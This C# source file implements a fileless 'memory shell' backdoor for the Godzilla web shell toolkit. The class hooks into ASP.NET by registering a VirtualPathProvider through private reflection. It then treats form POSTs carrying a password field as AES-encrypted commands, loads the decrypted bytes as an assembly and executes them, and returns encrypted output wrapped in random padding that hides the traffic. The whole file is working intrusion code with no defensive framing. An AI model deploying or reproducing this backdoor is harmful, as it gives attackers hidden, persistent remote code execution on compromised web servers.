using System;
using System.Collections;
using System.Reflection;
using System.Runtime.Remoting;
using System.Text;
using System.Web.Caching;
using System.Web.Hosting;
using System.Web;

namespace GodzillaMemoryShellProject
{
    //Support .net framework 2.0 - all connects to existing executables such as aspx/asmx/ashx/soap when connecting
    public class VirtualPathProviderMemoryShell : VirtualPathProvider
    {
        public string password = "pass";
        public string key = "3c6e0b8a9c15224a";
        private Assembly payload;
        private Random rd = new Random();
        public static bool load = false;

        static VirtualPathProviderMemoryShell()
        {
            try
            {
                Type hostingEnvironmentType = typeof(HostingEnvironment);
                MethodInfo registerVirtualPathProviderInternalMethodInfo = hostingEnvironmentType.GetMethod("RegisterVirtualPathProviderInternal", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Static | BindingFlags.InvokeMethod);
                VirtualPathProviderMemoryShell virtualPathProvider = new VirtualPathProviderMemoryShell();;
                registerVirtualPathProviderInternalMethodInfo.Invoke(null, new object[] { virtualPathProvider });
                virtualPathProvider.InitializeLifetimeService();
                load = true;
            }
            catch (Exception)
            {
            }

        }

        public VirtualPathProviderMemoryShell()
        {

        }
        public override string CombineVirtualPaths(string basePath, string relativePath)
        {
            return Previous.CombineVirtualPaths(basePath, relativePath);
        }

        public override ObjRef CreateObjRef(Type requestedType)
        {
            return Previous.CreateObjRef(requestedType);
        }

        public override bool DirectoryExists(string virtualDir)
        {
            return Previous.DirectoryExists(virtualDir);
        }

        public override bool Equals(object obj)
        {
            return Previous.Equals(obj);
        }

        public override bool FileExists(string virtualPath)
        {
            return Previous.FileExists(virtualPath);
        }

        public override CacheDependency GetCacheDependency(string virtualPath, IEnumerable virtualPathDependencies, DateTime utcStart)
        {
            return Previous.GetCacheDependency(virtualPath, virtualPathDependencies, utcStart);
        }
        public static string GenerateRandomString(int length)
        {
            char[] constant = new char[0x7e - 0x20];

            for (int i = 0; i < constant.Length; i++)
            {
                constant[i] = (char)(i + 0x20);
            }
            StringBuilder sb = new StringBuilder();
            byte[] b = new byte[4];
            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
            Random rd = new Random(BitConverter.ToInt32(b, 0));
            for (int i = 0; i < length; i++)
            {
                sb.Append(constant[rd.Next(constant.Length - 1)].ToString());
            }
            return sb.ToString(); ;
        }
        public override string GetCacheKey(string virtualPath)
        {
            try
            {
                HttpContext.Current.Application.Contents.Count.ToString();
                HttpContext Context = HttpContext.Current;
                if (HttpContext.Current.Request.ContentType.Contains("www-form") && Context.Request[password] != null)
                {
                    string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(password + key))).Replace("-", "");
                    byte[] data = System.Convert.FromBase64String(Context.Request[password]);
                    data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
                    if (payload == null)
                    {
                        payload = (Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                    }
                    else
                    {
                        object o = payload.CreateInstance("LY");
                        System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                        o.Equals(outStream);
                        o.Equals(data);
                        o.ToString();
                        byte[] r = outStream.ToArray();
                        if (r.Length > 0)
                        {
                            outStream.Dispose();

                            Context.Response.Write(GenerateRandomString(rd.Next(5, 50)));
                            Context.Response.Write(md5.Substring(0, 16));
                            Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));
                            Context.Response.Write(md5.Substring(16));
                            Context.Response.Write(GenerateRandomString(rd.Next(10, 60)));
                            HttpContext.Current.Response.End();
                            return Previous.GetCacheKey(virtualPath);
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
            return Previous.GetCacheKey(virtualPath);
        }
    }
}
